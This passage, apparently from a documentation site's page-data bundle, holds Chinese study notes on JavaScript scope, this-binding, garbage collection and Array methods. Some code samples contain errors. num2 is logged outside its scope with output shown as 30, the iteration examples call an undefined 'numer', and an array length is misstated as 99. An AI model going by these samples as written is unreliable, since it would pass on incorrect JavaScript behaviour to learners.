一级级向上查找变量对象的有序链表（这样的有序链表其实就是一个指向作用域链范围内所有变量对象的 指针列表）。也就是说嵌套在里层的代码段能访问到外层定义的变量，而外层访问不了里层的。\n    * this：记录着函数被调用时的信息，this绑定的是函数 调用处的对象（跟函数本身没关系）。有四种场景（已排优先级)：\n      * 如果函数是由new调用的（new绑定），那么this绑定的是新创建的对象。var bar = new Foo();，this绑定了bar；\n      * 如果函数通过call、apply调用（显示绑定）或bind（硬绑定）调用，那么this绑定的是指定的对象。var bar = foo.call(obj);，this绑定了obj；\n      * 如果函数由某个上下文对象调用（隐式绑定），那么this绑定的是那个上下文对象。var bar = obj.foo();，this绑定了obj；obj1.obj2.foo();，this绑定了obj2；\n      * 如果不是上面三种，那就是使用默认绑定，this绑定的是全局对象window。严格模式下全局对象无法使用默认绑定，因此this会绑定到undefined。（有个坑爹的地方，假如函数创建在非严格模式的全局环境里，但是在一小块严格模式代码里调用了函数，这个函数可以绑定全局对象）\n\n 4. 假如代码段里有var a = 0;这句，编译遇到var 时（声明提升了），编译器会拿a这个名字 通过作用域链 去当前执行环境的 变量对象 里查找是否存在，不存在就在变量对象里 新声明一个a（存的是undefined），存在的话会 忽略var 并继续往下编译。这一段代码段 编译完后，就开始执行 这一段代码段，执行遇到a = 0时（声明提升了，a = 0还在原地），引擎会先拿a这个名字 通过作用域链 去当前执行环境的 变量对象 里查找是否有a这个变量存在，存在话就拿来用（也就是把0这个值赋给a变量），不存在的话继续向上一级查找，直到最外层的 全局执行环境 的 变量对象 里还没找到那就抛异常（其实在非严格模式下会在全局执行环境的变量对象里，创建一个全局变量，返回给引擎并不会抛异常）。\n\n 5. 在一段代码段运行完（编译了也执行完了），代码段抽象出的执行环境 会被销毁，连带着里面的 变量对象、作用域链和this 都会被销毁，只有代码段再次被调用时才会建立一个新的执行环境。\n\n 6. 之前说代码段被分成三种：全局代码段、函数代码段、eval代码段（不推荐使用）。那么可以说js 没有块级作用域，只有 全局作用域 和 函数作用域，比如if和for这种语句的{}里的变量也可在外面使用。\n\n 7. 为什么不推荐用eval()，因为它可以在代码执行时，来声明“代码字符串”里的变量，从而 改变了编译时的作用域。类似还有with()，它是在代码执行时，把某些对象的属性也当做标识符，从而 新建了一个作用域。这两个 非但没有在编译期被优化，反而在执行期改变了作用域拖慢代码运行速度，而且这两个在严格模式下是被禁止的。\n\n 8. 可以去函数表达式#闭包进一步学习。\n\n\n# 三、垃圾收集\n\njs具有 自动 垃圾收集机制，这种机制原理：找出那些不再被使用的变量，然后释放其占用的内存。\n\n\n# 3.1 标识清除\n\n标识清除是js 最常见 的垃极收集方式，垃圾收集器在运行时，它会先给内存中所有的变量 加上标记（不管变量有用还是无用），然后垃圾收集器会 去掉 那些 可以被访问 的变量身上的 标记，剩下的那些无法被访问的变量自然还留有标记，最后垃圾收集器对 留有标记 的变量进行 内存清除工作（销毁标记值和所占内存）。\n\n\n# 3.2 引用计数\n\n引用计数目前者 不再被使用在js引擎中，引用计数会跟踪记录每个值 被引用的次数。声明一个变量并给这个变量赋了一个引用类型的值，这个引用次数就是1；当这个引类型的值再被赋给另一个变量时，该值的引用次数加1；当这个引用类型的值不再被引用时，这个引用次数就变成了0，就会被回收。\n\n循环引用：对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的指针。（例如对象A的某属性指向B对象，B对象的某属性指向A对象）\n\n当代码里存在循环引用这种情况，引用计数时他们的引用次数永远不会为0，被多次调用后就会导致大量的内有得不到回收。\n\n\n# 3.3 内存管理\n\n将变量的值 设为null，可以释放其引用（以便于被回收），这种做法叫做 解除引用。\n\n解除引用可以用在前面提到的 循环引用 上来 切断连接，也可以用在不再被使用的全局变量和全局变量的属性上，这也是优化内存占用的最佳方式，为执行中的代码只保有必要的数据，不必要的数据为其解除引用。',normalizedContent:'# 变量、作用域和内存问题\n\n\n# 一、基本类型和应用类型的值\n\necmascript变量的值可以是基本类型或引用类型，之前介绍了undefined、null、boolean、number和string这5种基本数据类型，它是按 值 访问可以 操作 保存在变量中的 实际值，而引用类型的值是保存在堆内存中，按 引用 访问的。\n\n\n# 1.1 动态的属性\n\n对于应用类型的值，我们可以为其添加属性和方法，也可以改变和删除属性和方法，而对于基本类型的值我们不能添加属性，就算添加了后面访问这个属性也是undefined。\n\n\n# 1.2 复制变量值\n\n 1. 如果从一个变量向另一个变量复制基本类型的值，会在变量对象上创建一个新值。然后把该值复制到为新变量分配的位置上，例：\n    \n    var num1 = 5;\n    var num2 = num1; // num1的5和num2的5完全独立，两变量可以参与任何操作而不会互相影响。\n    \n    \n    1\n    2\n    \n    \n    \n\n 2. 如果从一个变量向另一个变量复制引用类型的值，也会把变量对象中的值赋值一份放到新变量分配的位置上。其实这个值的副本是个指针，和复制前变量指向堆内存中的同一个对象，例：\n    \n    var obj1 = new object();\n    var obj2 = obj1; // 地址值复制过去了，地址值之间互不影响，但要操作地址对应的对象就会有影响。\n    \n    \n    1\n    2\n    \n    \n    \n\n\n# 1.3 传递参数\n\n * 按值传递：在参数传递过程中，形参和实参占用了 两个完全不同的内存空间（栈），形参所存储的内容是实参存储内容的一份拷贝。\n * 按应用传递：在参数传递过程中，形参和实参完全是 同一块内存空间（栈），两份不分彼此。\n * 而ecmascript中所有函数的参数都是 按值传递 的。\n * 基本类型值的传递如同基本类型变量的复制一样，而应用类型值的传递则如同应用类型变量的复制一样（参考上一节）。\n\n例1：\n\nfunction addten(num2) {\n    num2 += 10;\n    return num2;\n}\nvar num1 = 20;\nvar result = addten(num1);\nconsole.log(num1); // 20\nconsole.log(num2); // 30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在调用addten函数时，num1存储内容复制了一份给num2，复制后num1和num2都为20但互不影响；在addten函数里，num2加了10之后是对num1没有影响的，这是 按值传递，所以最后的输出结果num1是20，num2是30；假设它是 按引用传递 ，那么num1和num2是同一份，最后的值应该都是30才对，与实际输出不一致。\n\n例2：\n\nfunction setname(obj) {     // (3) 如下图(2)(3)，将person的地址值复制了一份给obj，让obj也指向那个实例化对象\n    obj.name = "n";         // (4) 如下图(4)，给那个实例化对象新添一个name属性，该属性值为"n"\n    obj = new object();     // (5) 如下图(5)，又创建了一个oject的实例化对象，让obj指向这个新的实例化对象\n    obj.name = "g";         // (6) 如下图(6)，给新的实例化对象新添一个name属性，该属性值为"g"\n}\nvar person = new object();  // (1) 如下图(1)，声明了person变量，初始化的值是oject引用类型的一个实例化对象\nsetname(person);            // (2) 去调用setname函数，将person这个变量传入\nconsole.log(person.name);   // (7) 如下图(7)，函数调用完会清理其中的局部变量，只剩下外部的person和其指引的对象了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\n可以看出来，步骤(5)是关键，它可以指向新的实例化对象；如果是 按引用传递 的话，person和obj就是同一份（在栈里），在obj指向新对象时，person也指向新对象，实际上步骤(7)打印出的是"n"，所以它还是 按值传递（在堆确实还是同一份，但在栈里不是同一份，是复制了一份）。\n\n\n# 1.4 检测类型\n\n * 检测变量是不是基本数据类型用typeof操作符，而检测引用类型变量是什么类型的对象可以用instanceof操作符；\n * 所有引用类型的值 都是object的实例，在检测一个引用类型值和object构造函数时，instanceof操作符始终会返回 true；\n * 使用instanceof操作符检测 基本类型 会返回 false，基本类型不是对象。\n\n\n# 二、执行环境及作用域\n\n在研读《javascript高级程序设计》的4.2节后仍有很多不解，需要去研读《你不知道的javascript(上卷)》的第一部的一二章和第二部的一二章，你会有转深刻的理解，这里就记录一些浅显的见解吧。\n\n 1. js是“解释执行”语言，这里不得不提到js的 引擎和编译器。引擎负责整个js程序的 编译和执行过程，引擎只是负责编译的 引导 而实际上具体编译的活是 编译器 在干（词法语法分析并生成可执行的机器指令）。\n\n 2. js代码大多是一段段嵌套起来的，那么对代码段可以分成三种：全局代码段、函数代码段、eval代码段（不推荐使用）。js代码运行的时候，是先编译再执行，并且编译发生在化码执行前的几微秒甚至更短时间里。但是，这里的编译执行都是按照一段段来的，并不是把文件里的所有代码都编译后再执行的，而是 编译一段执行一段。\n\n 3. js运行到某段代码时（某个函数被调用时），先编译分析这段代码并创建一个 执行环境(execution context)，也称 执行上文（简称ec）。执行环境有三个重要的组成：变量对象、作用域链、this。\n    \n    * 变量对象：variable object，简称vo。存储着执行环境里的 所有变量和函数声明。当执行流在这个执行坏境里执行时，这个变量对象就是 活动对象(activation object)。\n    * 作用域：scope。是 根据名称查找变量的一套规则，这个规则只在所处代码段里有效（这里指的是 作用域范围），其实作用域存的不是变量对象本身而是指向变量对象的 指针。\n    * 作用城链：scope chain。代码段的嵌套使得作用域可以连接到一起了，这祥就形成了一个能 一级级向上查找变量对象的有序链表（这样的有序链表其实就是一个指向作用域链范围内所有变量对象的 指针列表）。也就是说嵌套在里层的代码段能访问到外层定义的变量，而外层访问不了里层的。\n    * this：记录着函数被调用时的信息，this绑定的是函数 调用处的对象（跟函数本身没关系）。有四种场景（已排优先级)：\n      * 如果函数是由new调用的（new绑定），那么this绑定的是新创建的对象。var bar = new foo();，this绑定了bar；\n      * 如果函数通过call、apply调用（显示绑定）或bind（硬绑定）调用，那么this绑定的是指定的对象。var bar = foo.call(obj);，this绑定了obj；\n      * 如果函数由某个上下文对象调用（隐式绑定），那么this绑定的是那个上下文对象。var bar = obj.foo();，this绑定了obj；obj1.obj2.foo();，this绑定了obj2；\n      * 如果不是上面三种，那就是使用默认绑定，this绑定的是全局对象window。严格模式下全局对象无法使用默认绑定，因此this会绑定到undefined。（有个坑爹的地方，假如函数创建在非严格模式的全局环境里，但是在一小块严格模式代码里调用了函数，这个函数可以绑定全局对象）\n\n 4. 假如代码段里有var a = 0;这句，编译遇到var 时（声明提升了），编译器会拿a这个名字 通过作用域链 去当前执行环境的 变量对象 里查找是否存在，不存在就在变量对象里 新声明一个a（存的是undefined），存在的话会 忽略var 并继续往下编译。这一段代码段 编译完后，就开始执行 这一段代码段，执行遇到a = 0时（声明提升了，a = 0还在原地），引擎会先拿a这个名字 通过作用域链 去当前执行环境的 变量对象 里查找是否有a这个变量存在，存在话就拿来用（也就是把0这个值赋给a变量），不存在的话继续向上一级查找，直到最外层的 全局执行环境 的 变量对象 里还没找到那就抛异常（其实在非严格模式下会在全局执行环境的变量对象里，创建一个全局变量，返回给引擎并不会抛异常）。\n\n 5. 在一段代码段运行完（编译了也执行完了），代码段抽象出的执行环境 会被销毁，连带着里面的 变量对象、作用域链和this 都会被销毁，只有代码段再次被调用时才会建立一个新的执行环境。\n\n 6. 之前说代码段被分成三种：全局代码段、函数代码段、eval代码段（不推荐使用）。那么可以说js 没有块级作用域，只有 全局作用域 和 函数作用域，比如if和for这种语句的{}里的变量也可在外面使用。\n\n 7. 为什么不推荐用eval()，因为它可以在代码执行时，来声明“代码字符串”里的变量，从而 改变了编译时的作用域。类似还有with()，它是在代码执行时，把某些对象的属性也当做标识符，从而 新建了一个作用域。这两个 非但没有在编译期被优化，反而在执行期改变了作用域拖慢代码运行速度，而且这两个在严格模式下是被禁止的。\n\n 8. 可以去函数表达式#闭包进一步学习。\n\n\n# 三、垃圾收集\n\njs具有 自动 垃圾收集机制，这种机制原理：找出那些不再被使用的变量，然后释放其占用的内存。\n\n\n# 3.1 标识清除\n\n标识清除是js 最常见 的垃极收集方式，垃圾收集器在运行时，它会先给内存中所有的变量 加上标记（不管变量有用还是无用），然后垃圾收集器会 去掉 那些 可以被访问 的变量身上的 标记，剩下的那些无法被访问的变量自然还留有标记，最后垃圾收集器对 留有标记 的变量进行 内存清除工作（销毁标记值和所占内存）。\n\n\n# 3.2 引用计数\n\n引用计数目前者 不再被使用在js引擎中，引用计数会跟踪记录每个值 被引用的次数。声明一个变量并给这个变量赋了一个引用类型的值，这个引用次数就是1；当这个引类型的值再被赋给另一个变量时，该值的引用次数加1；当这个引用类型的值不再被引用时，这个引用次数就变成了0，就会被回收。\n\n循环引用：对象a中包含一个指向对象b的指针，而对象b中也包含一个指向对象a的指针。（例如对象a的某属性指向b对象，b对象的某属性指向a对象）\n\n当代码里存在循环引用这种情况，引用计数时他们的引用次数永远不会为0，被多次调用后就会导致大量的内有得不到回收。\n\n\n# 3.3 内存管理\n\n将变量的值 设为null，可以释放其引用（以便于被回收），这种做法叫做 解除引用。\n\n解除引用可以用在前面提到的 循环引用 上来 切断连接，也可以用在不再被使用的全局变量和全局变量的属性上，这也是优化内存占用的最佳方式，为执行中的代码只保有必要的数据，不必要的数据为其解除引用。',charsets:{cjk:!0}},{title:"3.引用类型",frontmatter:{title:"3.引用类型"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/3.%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/3.引用类型.md",key:"v-3a3bc896",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/3.%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html",headers:[{level:2,title:"一、Object类型",slug:"一、object类型",normalizedTitle:"一、object类型",charIndex:13},{level:2,title:"二、Array类型",slug:"二、array类型",normalizedTitle:"二、array类型",charIndex:27},{level:3,title:"2.1 创建数组",slug:"_2-1-创建数组",normalizedTitle:"2.1 创建数组",charIndex:42},{level:3,title:"2.2 isArray检测数组",slug:"_2-2-isarray检测数组",normalizedTitle:"2.2 isarray检测数组",charIndex:56},{level:3,title:"2.3 toString/valueOf等转换方法",slug:"_2-3-tostring-valueof等转换方法",normalizedTitle:"2.3 tostring/valueof等转换方法",charIndex:77},{level:3,title:"2.4 push/pop尾部添加移除",slug:"_2-4-push-pop尾部添加移除",normalizedTitle:"2.4 push/pop尾部添加移除",charIndex:108},{level:3,title:"2.5 unshift/shift首部添加移除",slug:"_2-5-unshift-shift首部添加移除",normalizedTitle:"2.5 unshift/shift首部添加移除",charIndex:132},{level:3,title:"2.6 reverse/sort重排序",slug:"_2-6-reverse-sort重排序",normalizedTitle:"2.6 reverse/sort重排序",charIndex:161},{level:3,title:"2.7 concat/slice/splice拼接裁剪",slug:"_2-7-concat-slice-splice拼接裁剪",normalizedTitle:"2.7 concat/slice/splice拼接裁剪",charIndex:186},{level:3,title:"2.8 indexOf/lastIndexOf搜索项",slug:"_2-8-indexof-lastindexof搜索项",normalizedTitle:"2.8 indexof/lastindexof搜索项",charIndex:219},{level:3,title:"2.9 every/some/filter/map/forEach迭代",slug:"_2-9-every-some-filter-map-foreach迭代",normalizedTitle:"2.9 every/some/filter/map/foreach迭代",charIndex:251},{level:3,title:"2.10 reduce/reduceRight归并",slug:"_2-10-reduce-reduceright归并",normalizedTitle:"2.10 reduce/reduceright归并",charIndex:292},{level:2,title:"三、Date类型",slug:"三、date类型",normalizedTitle:"三、date类型",charIndex:321},{level:2,title:"四、RegExp类型",slug:"四、regexp类型",normalizedTitle:"四、regexp类型",charIndex:333},{level:3,title:"4.1 RegExp实例属性",slug:"_4-1-regexp实例属性",normalizedTitle:"4.1 regexp实例属性",charIndex:349},{level:3,title:"4.2 RegExp实例方法",slug:"_4-2-regexp实例方法",normalizedTitle:"4.2 regexp实例方法",charIndex:369},{level:3,title:"4.3 RegExp构造函数属性",slug:"_4-3-regexp构造函数属性",normalizedTitle:"4.3 regexp构造函数属性",charIndex:389},{level:3,title:"4.4 模式的局限性",slug:"_4-4-模式的局限性",normalizedTitle:"4.4 模式的局限性",charIndex:411},{level:2,title:"五、Function类型",slug:"五、function类型",normalizedTitle:"五、function类型",charIndex:425},{level:3,title:"5.1 函数声明/函数表达式/构造函数的区别",slug:"_5-1-函数声明-函数表达式-构造函数的区别",normalizedTitle:"5.1 函数声明/函数表达式/构造函数的区别",charIndex:443},{level:3,title:"5.2 没有重载",slug:"_5-2-没有重载",normalizedTitle:"5.2 没有重载",charIndex:471},{level:3,title:"5.3 作为值的函数",slug:"_5-3-作为值的函数",normalizedTitle:"5.3 作为值的函数",charIndex:485},{level:3,title:"5.4 函数内部属性(arguments/this)",slug:"_5-4-函数内部属性-arguments-this",normalizedTitle:"5.4 函数内部属性(arguments/this)",charIndex:501},{level:3,title:"5.5 函数属性和方法(apply/call/bind)",slug:"_5-5-函数属性和方法-apply-call-bind",normalizedTitle:"5.5 函数属性和方法(apply/call/bind)",charIndex:533},{level:2,title:"六、基本包装类型",slug:"六、基本包装类型",normalizedTitle:"六、基本包装类型",charIndex:565},{level:3,title:"6.1 Boolean包装类型",slug:"_6-1-boolean包装类型",normalizedTitle:"6.1 boolean包装类型",charIndex:579},{level:3,title:"6.2 Number包装类型",slug:"_6-2-number包装类型",normalizedTitle:"6.2 number包装类型",charIndex:600},{level:3,title:"6.3 String包装类型",slug:"_6-3-string包装类型",normalizedTitle:"6.3 string包装类型",charIndex:620},{level:2,title:"七、单体内置对象",slug:"七、单体内置对象",normalizedTitle:"七、单体内置对象",charIndex:940},{level:3,title:"7.1 Global对象",slug:"_7-1-global对象",normalizedTitle:"7.1 global对象",charIndex:954},{level:3,title:"7.2 Math对象",slug:"_7-2-math对象",normalizedTitle:"7.2 math对象",charIndex:1060}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Object类型 二、Array类型 2.1 创建数组 2.2 isArray检测数组 2.3 toString/valueOf等转换方法 2.4 push/pop尾部添加移除 2.5 unshift/shift首部添加移除 2.6 reverse/sort重排序 2.7 concat/slice/splice拼接裁剪 2.8 indexOf/lastIndexOf搜索项 2.9 every/some/filter/map/forEach迭代 2.10 reduce/reduceRight归并 三、Date类型 四、RegExp类型 4.1 RegExp实例属性 4.2 RegExp实例方法 4.3 RegExp构造函数属性 4.4 模式的局限性 五、Function类型 5.1 函数声明/函数表达式/构造函数的区别 5.2 没有重载 5.3 作为值的函数 5.4 函数内部属性(arguments/this) 5.5 函数属性和方法(apply/call/bind) 六、基本包装类型 6.1 Boolean包装类型 6.2 Number包装类型 6.3 String包装类型 七、单体内置对象 7.1 Global对象 7.2 Math对象",content:'# 引用类型\n\n\n\n * 一、Object类型\n * 二、Array类型\n   * 2.1 创建数组\n   * 2.2 isArray检测数组\n   * 2.3 toString/valueOf等转换方法\n   * 2.4 push/pop尾部添加移除\n   * 2.5 unshift/shift首部添加移除\n   * 2.6 reverse/sort重排序\n   * 2.7 concat/slice/splice拼接裁剪\n   * 2.8 indexOf/lastIndexOf搜索项\n   * 2.9 every/some/filter/map/forEach迭代\n   * 2.10 reduce/reduceRight归并\n * 三、Date类型\n * 四、RegExp类型\n   * 4.1 RegExp实例属性\n   * 4.2 RegExp实例方法\n   * 4.3 RegExp构造函数属性\n   * 4.4 模式的局限性\n * 五、Function类型\n   * 5.1 函数声明/函数表达式/构造函数的区别\n   * 5.2 没有重载\n   * 5.3 作为值的函数\n   * 5.4 函数内部属性(arguments/this)\n   * 5.5 函数属性和方法(apply/call/bind)\n * 六、基本包装类型\n   * 6.1 Boolean包装类型\n   * 6.2 Number包装类型\n   * 6.3 String包装类型\n     * 6.3.1 charAt/charCodeAt字符\n     * 6.3.2 concat/slice/substr/substring拼接裁剪\n     * 6.3.3 indexOf/lastIndexOf搜索字符\n     * 6.3.4 trim删除空格\n     * 6.3.5 toLowerCase/toUpperCase大小写转换\n     * 6.3.6 match/search模式匹配\n     * 6.3.7 replace/split替换和分割\n     * 6.3.8 localeCompare比较\n     * 6.3.9 fromCharCode字符转换\n * 七、单体内置对象\n   * 7.1 Global对象\n     * 7.1.1 URI编码\n     * 7.1.2 eval()方法\n     * 7.1.3 Global对象的属性\n     * 7.1.3 window对象\n   * 7.2 Math对象\n     * 7.2.1 Math对象属性\n     * 7.2.2 min/max最大最小值\n     * 7.2.3 ceil/round/floor取整\n     * 7.2.4 random取随机数\n     * 7.2.5 其他方法\n\n\n\n引用类型是一种用于将 数据 和 功能 组织在一起的数据结构，也就是说它可以描述一类对象所具有的 属性 和 方法。那么某个对象（引用类型的值）是引用类型的一个实例。\nvar person = new Object();新对像是使用new操作符后跟一个构造函数来创健的。\n\n\n# 一、Object类型\n\nObject是ECMAScript中使用最多的一个类型，创建Object实例的方式有两种，一种是之前提到的new操作符后跟Object构造函数，另一种是我们比较推荐使用的对象字面量表示法。\nvar person = new Object();等价于var person = {};\n\n * {}里可以定义属性，如：var person = { age: 24 }; 这是一个对象上下文，若属性名是数值，会自动转为String；\n * 访问对象属性可使用点表示法也可使用方括号表示法，如：person["age"]和person.age；方括号表示法用在属性名不规范的情况下，比如含有空格等字符，点表示法就需要属性名尽可能像标识符那样规范。\n\n\n# 二、Array类型\n\nArray是ECMAScript中除Object最常用的类型，与其他语言不同的是它的每一项可保存 任何类型 的数据（位置0存字符串，位置1存数值，位置2存对象等等），并且数组大小是 动态调整 的（创建时的长度可随着新增的元素而变长）。\n\n\n# 2.1 创建数组\n\n创建数组有两种：\n\n第一种 自然是 new操作符后跟Array构造函数（new可省略）\n\nvar colors = new Array(3);      // 入参是数值3，创建长度为3的数组，入参也可以不传\nvar names = new Array("Greg");  // 入参不是数值，创建了一个包含“Greg”元素的数组\n\n\n1\n2\n\n\n第二种 是使用 数组字面量表示法，var names = [];等价于var names = new Array();，如果有[1, 2, ] 或 [ , , ,]，它可能在不同浏览器里有不同的效果，不推荐省略元素这种写法。\n\n关于 数组长度 (length)，length值比原数组大时，新数组新增出来的位置会使用undefined值填充，而length值比原数组小时，新数组会移除多出来的位置，可以访问多出来的位置但值是undefined\n\nvar colors = ["red", "blue", "green"];\ncolors[2] = "black";    // 修改数组第三项的值为"black"\ncolors[3] = "brown";    // 新增第四项"brown"\ncolors.length = 6;      // 增长数组，现数组：["red", "blue", "black", "brown", undefined, undefined]\ncolors.length = 2;      // 减短数组，现数组：["red", "blue"]，如果此时访问colors[4]那返回的是undefined\ncolors[99] = "black";   // 增长数组，现数组：["red", "blue", undefined, ..., undefined, "black"]，长度为99\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.2 isArray检测数组\n\n只有一个网页或一个全局执行环境是，我们使用instanceof就可以检测对象是不是数组。但是在多个网页或多个全局执行环境时，他们数组的构造函数版本不一样，导致判断不了，这时Array.isArray()方法可以确定它是不是数组，不管它是在哪个全局执行环境中创建的。\n\n\n# 2.3 toString/valueOf等转换方法\n\n所有对象都有toString()、toLocaleString()和valueOf()，数组对象也有：\n\n * valueOf()：返回的还是数组本身；\n * toString()：把数组每一项的toString()结果以字符串形式拼接起来，用逗号分隔；\n * toLocaleString()：把数组每一项的toLocaleString()结果以字符串形式拼接起来，用逗号分隔；\n * 除上述3个方法，数组还有join()方法，它其实是数组的toString()方法返回结果把逗号换成了join()里的参数，没有参数则还是逗号，例如：join("||")就把,换成||；\n * 如果数组的某项是null或undefined的，那么在上述4中方法结果中以空字符串表示\n\n\n# 2.4 push/pop尾部添加移除\n\nECMAScript数组提供了一种类似于栈数据结构特点（后进先出）的方法：\n\nvar colors = ["red", "blue"];\ncolors.push("brown");       // 在数组末尾逐个添加push参数中的项，可以添加多项\nvar item = colors.pop();    // 移除数组末尾最后一项，并将结果返回给item，数组长度会减1\n\n\n1\n2\n3\n\n\n\n# 2.5 unshift/shift首部添加移除\n\n 1. ECMAScript数组提供了一种类似于队列数据结构特点（先进先出）的方法：\n    \n    var colors = ["red", "blue"];\n    colors.push("black");\n    var item = colors.shift();    // 移除数组末尾第一项，并将结果返回给item，数组长度会减1\n    \n    \n    1\n    2\n    3\n    \n\n 2. 其实还有一个与shift相反的方法unshift()：\n    \n    var colors = ["red", "blue"];\n    var count = colors.unshift("black", "green"); // 在数组的手段推入两项，返回现数组长度4，其实跟push类似但作用位置不同\n    var item =  colors.pop(); // 移除了最尾端的一项，那么数组最后就是["green", "black", "red"]\n    \n    \n    1\n    2\n    3\n    \n\n\n# 2.6 reverse/sort重排序\n\n数组中用来重排序的方法有reverse()和sort()，其中reverse()会 反转 数组项的顺序；\nsort()按升序排列数组项，但它实际上先把每项调用toString()转换成字符串比较再排序的，我们也知道字符串的比较时对应位置字符编码值的比较（一位一位进行比较，只要一位要结果后面的几位就不用看了）。\n所以sort()又有一种用法，把一个 比较函数 作为sort()的参数，比较函数有2个入参，如果第一个参数位于第二参数之后就返回正数（大于并返回正数），而位于之前就返回负数（小于并返回负数），相等就返回0，这样排序出来是 升序 的，降序的就是 大于并返回负数、小于并返回负数、等于返回0。\n\nfunction compare(v1, v2) {\n    if (v1 < v2) {\n        return -1;\n    } else if (v1 > v2) {\n        return 1;\n    } else {\n        return 0;\n    }\n    // return v1 - v2; // 前提是v1 v2是数值\n}\nvar values = [0, 10, 15, 1, 5];\nvalues.sort(compare);\nconsole.log(values); // [0, 1, 5, 10, 15]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如果数组里的类型是引用类型，要对其某个属性进行排序，例：\n\nfunction comparisonFunction(propertyName) {\n    return function (object1, object2) {\n        var v1 = object1[propertyName];\n        var v2 = object2[propertyName];\n        if (v1 < v2) {\n            return -1;\n        } else if (v1 > v2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nvar values = [ { age: 3 }, { age: 10 }, { age: 15 }, { age: 1 }, { age: 5 } ];\nvalues.sort(comparisonFunction("age"));\nconsole.log(values); // [ { age: 1 }, { age: 3 }, { age: 5 }, { age: 10 }, { age: 15 } ]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.7 concat/slice/splice拼接裁剪\n\n 1. concat()会先创建当前数组的一个 副本，然后将接收到的参数添加到这个副本的 末尾。接收到的参数可以是 数组和单个项的混合体，是数组的话会把数组 每项 添到末尾。例：\n    \n    var colors = ["red", "green", "blue"];\n    var colors2 = colors.concat("yellow", ["black", "brown"]);\n    console.log(colors);     // ["red", "green", "blue"]，原数组不变创建了新数组来添加新元素到末尾\n    console.log(colors2);    // ["red", "green", "blue", "yellow", "black", "brown"]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. slice()会先创建当前数组的一个 副本，然后会按照参数去对应位置 截取 数组。例：\n    \n    var colors = ["red", "green", "blue", "yellow", "purple"];\n    var colors2 = colors.slice(1);       // 可以是一个参数，截取指定位置到末尾的项\n    var colors3 = colors.slice(1, 4);    // 可以是两个参数，截取[1, 4)位置的项\n    var colors4 = colors.slice(-2, -1);    // 如果参数有负数，会在负数上加上数组长度，也就是[3, 4]\n    console.log(colors);     // ["red", "green", "blue", "yellow", "purple"]，原数组不变\n    console.log(colors2);    // ["green", "blue", "yellow", "purple"]\n    console.log(colors3);    // ["green", "blue", "yellow"]\n    console.log(colors4);    // ["yellow"]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. splice()是操作 原数组本身，最后会返回删除的项组成的 数组；它有几个参数，第一个参数代表要操作的 位置，第二个参数代表从要操作的位置往后 删除几项，第三个以及后面的参数代表在删除位置上 新增的项。例：\n    \n    var colors = ["red", "green", "blue"];\n    var removed = colors.splice(1, 1, "red", "purple");\n    console.log(colors);     // ["red", "red", "purple", "blue"] 在位置1上删除1个元素，并添加"red"和"purple")\n    console.log(removed);    // ["green"] 删除的元素组成的数组\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 2.8 indexOf/lastIndexOf搜索项\n\n 1. indexOf(item, start)在数组的 start位置向右查找item，查找到以后返回该位置 索引，没有找到的话就返回 -1，如果没有start参数代表是从位置0开始向右查找的。\n 2. lastIndexOf(item, start)在数组的 start位置向左查找item，查找到以后返回该位置 索引，没有找到的话就返回 -1，如果没有start参数代表是从末尾开始向左查找的。\n\n\n# 2.9 every/some/filter/map/forEach迭代\n\nECMAScript5为数组定义了5个迭代方法，每个迭代方法都有两个参数：数组每项将要运行的函数和运行该函数的作用域对象（可选参数）。其中“运行的函数”有3个参数：数组的某项、该项索引、数组对象本身。\n\n 1. every()对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则最后返回true。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var everyResult = numer.every(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(everyResult); // false，要每一项都大于2，最后结果才是true\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. some()对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则最后返回true。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var someResult = numer.some(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(someResult); // true，只要有一项大于了2，最后就是true\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. filter()对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var filterResult = numer.filter(function(item, index, array) {\n        return item > 2;\n    });\n    console.log(filterResult); // [3, 4, 5, 4, 3]，只保留大于2的项，并将这些项组成新数组返回\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 4. map()对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var mapResult = numer.map(function(item, index, array) {\n        return item * 2;\n    });\n    console.log(mapResult); // [2, 4, 6, 8, 10, 8, 6, 4, 2]，对每一项都乘以2（可以是其他操作），并组成新数组返回\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. forEach()对数组中的每一项运行给定函数，没有返回值，淡出的遍历数组而去操作某个动作。例：\n    \n    var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1];\n    var eachResult = numer.forEach(function(item, index, array) {\n        // 执行某些操作\n    });\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 2.10 